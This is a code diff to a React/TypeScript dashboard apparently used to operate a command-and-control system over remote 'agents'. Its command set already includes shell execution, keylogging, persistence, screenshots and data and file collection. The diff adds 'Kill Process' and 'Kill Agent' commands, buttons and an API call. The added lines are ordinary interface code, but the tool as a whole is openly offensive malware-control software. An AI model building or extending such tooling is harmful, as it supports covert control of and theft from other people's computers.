@@ -18,7 +18,7 @@ interface Agent {
 interface Command {
   id: number;
   agent_id: string;
-  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files';
+  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process';
   command_data: string;
   status: 'pending' | 'executing' | 'completed' | 'failed';
   result: string;
@@ -47,7 +47,7 @@ const C2Dashboard: React.FC = () => {
   const [agents, setAgents] = useState<Agent[]>([]);
   const [results, setResults] = useState<Result[]>([]);
   const [selectedAgent, setSelectedAgent] = useState<string>('');
-  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files'>('shell');
+  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process'>('shell');
   const [commandData, setCommandData] = useState('');
   const [isLoading, setIsLoading] = useState(true);
   const [activeTab, setActiveTab] = useState<'agents' | 'commands' | 'results' | 'debug'>('agents');
@@ -173,6 +173,31 @@ const C2Dashboard: React.FC = () => {
     }
   };
 
+  const killAgent = async (agentId: string, killType: 'agent' | 'process') => {
+    if (!confirm(`Are you sure you want to kill this ${killType}? This action cannot be undone.`)) {
+      return;
+    }
+
+    try {
+      const response = await fetch(`/api/admin/c2/kill/${agentId}`, {
+        method: 'POST',
+        headers: getAuthHeaders(),
+        body: JSON.stringify({ killType })
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        alert(`Kill command sent successfully: ${result.message}`);
+        fetchData(); // Refresh data
+      } else {
+        alert('Failed to send kill command');
+      }
+    } catch (error) {
+      console.error('Error killing agent:', error);
+      alert('Error killing agent');
+    }
+  };
+
   const getStatusColor = (status: string) => {
     switch (status) {
       case 'active': return 'text-green-500';
@@ -201,6 +226,8 @@ const C2Dashboard: React.FC = () => {
       case 'persistence': return 'bg-indigo-500';
       case 'collect_data': return 'bg-teal-500';
       case 'collect_files': return 'bg-orange-500';
+      case 'kill_process': return 'bg-red-600';
+      case 'kill_agent': return 'bg-red-800';
       default: return 'bg-gray-500';
     }
   };
@@ -338,6 +365,31 @@ const C2Dashboard: React.FC = () => {
                         <span>{new Date(agent.last_seen).toLocaleString()}</span>
                       </div>
                     </div>
+                    {/* Kill Agent Buttons */}
+                    <div className="mt-4 pt-3 border-t border-gray-700">
+                      <div className="flex space-x-2">
+                        <button
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            killAgent(agent.agent_id, 'process');
+                          }}
+                          className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
+                          title="Kill the agent process (agent will restart if persistence is enabled)"
+                        >
+                          Kill Process
+                        </button>
+                        <button
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            killAgent(agent.agent_id, 'agent');
+                          }}
+                          className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
+                          title="Terminate the agent completely (marks as compromised)"
+                        >
+                          Kill Agent
+                        </button>
+                      </div>
+                    </div>
                   </div>
                 ))}
               </div>
@@ -385,6 +437,8 @@ const C2Dashboard: React.FC = () => {
                     <option value="persistence">Persistence</option>
                     <option value="collect_data">Collect Data</option>
                     <option value="collect_files">Collect Files</option>
+                    <option value="kill_process">Kill Process</option>
+                    <option value="kill_agent">Kill Agent</option>
                   </select>
                 </div>
               </div>
